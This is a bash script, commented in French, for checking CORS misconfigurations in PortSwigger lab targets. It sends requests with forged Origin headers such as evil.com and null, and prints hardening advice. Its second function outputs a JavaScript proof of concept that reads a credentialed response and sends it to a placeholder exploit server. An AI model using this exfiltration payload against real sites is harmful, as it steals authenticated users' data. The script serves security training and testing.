#!/bin/bash

# PortSwigger CORS Challenges - Automated Bash Script with Functions and Suggestions
# Usage: Edit the variables below with your target URLs and endpoints.

# --------- Configuration (edit these values) ---------
TARGET_URL="https://<your-lab>.web-security-academy.net"
CORS_ENDPOINT="/accountDetails"  # Example endpoint returning sensitive data
ORIGINS=("https://evil.com" "null" "https://subdomain.$(echo $TARGET_URL | cut -d/ -f3)" "http://trusted-subdomain.$(echo $TARGET_URL | cut -d/ -f3)" "https://example.com")
# -----------------------------------------------------

print_sep() {
    echo "------------------------------------------------------"
}

# 1. Test CORS headers with various Origin values
test_cors_headers() {
    print_sep
    echo "[1] Test des headers CORS avec différentes valeurs Origin"
    for origin in "${ORIGINS[@]}"; do
        echo -e "\nTest avec Origin: $origin"
        resp=$(curl -sk -D - -o /dev/null -H "Origin: $origin" "$TARGET_URL$CORS_ENDPOINT")
        echo "$resp" | grep -i "access-control-allow-origin"
        echo "$resp" | grep -i "access-control-allow-credentials"
        if echo "$resp" | grep -iq "access-control-allow-origin: $origin"; then
            echo ">> [ALERTE] L'origine $origin est reflétée dans Access-Control-Allow-Origin !"
            if echo "$resp" | grep -iq "access-control-allow-credentials: true"; then
                echo ">> [DANGER] Access-Control-Allow-Credentials: true détecté avec $origin !"
                echo ">> PROPOSITION : Ne jamais refléter d'origine dangereuse ou arbitraire avec allow-credentials."
            fi
        fi
        if echo "$resp" | grep -iq "access-control-allow-origin: \*"; then
            echo ">> [ALERTE] Access-Control-Allow-Origin: * détecté !"
            echo ">> PROPOSITION : Ne jamais utiliser * avec des endpoints sensibles ou allow-credentials."
        fi
    done
}

# 2. Test d'exploitation basique via origin reflection (PoC JS)
generate_basic_poc() {
    print_sep
    echo "[2] Génération d'une preuve de concept JS pour exploitation CORS (origin reflection)"
    echo "Utilisez ce code sur un exploit server ou en local pour tester l'exfiltration :"
    cat <<EOF
<script>
var req = new XMLHttpRequest();
req.onload = function() {
    location = 'https://YOUR-EXPLOIT-SERVER/log?key=' + encodeURIComponent(this.responseText);
};
req.open('GET', '$TARGET_URL$CORS_ENDPOINT', true);
req.withCredentials = true;
req.send();
</script>
EOF
    echo ">> [INFO] Si la clé ou les données sensibles s'affichent dans vos logs, la configuration CORS est vulnérable."
}

# 3. Test de configuration CORS dangereuse avec null ou protocoles mixtes
test_null_and_insecure() {
    print_sep
    echo "[3] Test de configuration CORS avec Origin: null et protocoles mixtes"
    resp_null=$(curl -sk -D - -o /dev/null -H "Origin: null" "$TARGET_URL$CORS_ENDPOINT")
    echo "Origin: null"
    echo "$resp_null" | grep -i "access-control-allow-origin"
    if echo "$resp_null" | grep -iq "access-control-allow-origin: null"; then
        echo ">> [ALERTE] Le serveur accepte l'origine null !"
        echo ">> PROPOSITION : Ne jamais autoriser l'origine null sauf cas strictement nécessaire."
    fi

    # Test d'un sous-domaine en HTTP si applicable
    INSECURE_ORIGIN="http://trusted-subdomain.$(echo $TARGET_URL | cut -d/ -f3)"
    resp_insecure=$(curl -sk -D - -o /dev/null -H "Origin: $INSECURE_ORIGIN" "$TARGET_URL$CORS_ENDPOINT")
    echo "Origin: $INSECURE_ORIGIN"
    echo "$resp_insecure" | grep -i "access-control-allow-origin"
    if echo "$resp_insecure" | grep -iq "access-control-allow-origin: $INSECURE_ORIGIN"; then
        echo ">> [ALERTE] Le serveur accepte un sous-domaine non sécurisé (HTTP) !"
        echo ">> PROPOSITION : Toujours exiger HTTPS pour les origines de confiance."
    fi
}

# 4. Conseils avancés et Burp Suite
burp_cors_info() {
    print_sep
    echo "[4] Conseils avancés et automatisation avec Burp Suite"
    echo "- Utilisez l'extension Burp 'CORS* - Additional CORS Checks' pour automatiser la détection de mauvaises configurations."
    echo "- L'extension teste la réflexion d'origines arbitraires, null, sous-domaines, protocoles mixtes, etc."
    echo "- Documentation : https://portswigger.net/web-security/cors"
    echo "- Extension : https://github.com/PortSwigger/additional-cors-checks"
}

# Main script execution
echo "=== PortSwigger CORS Automated Checks ==="
test_cors_headers
generate_basic_poc
test_null_and_insecure
burp_cors_info

print_sep
echo "[SYNTHÈSE]"
echo "1. Vérifiez si des origines arbitraires, null ou non sécurisées sont acceptées dans Access-Control-Allow-Origin."
echo "2. Testez l'exfiltration de données sensibles via la PoC JS générée."
echo "3. Utilisez Burp Suite et son extension CORS* pour une couverture complète."
echo "Documentation PortSwigger : https://portswigger.net/web-security/cors"
print_sep

# End of script
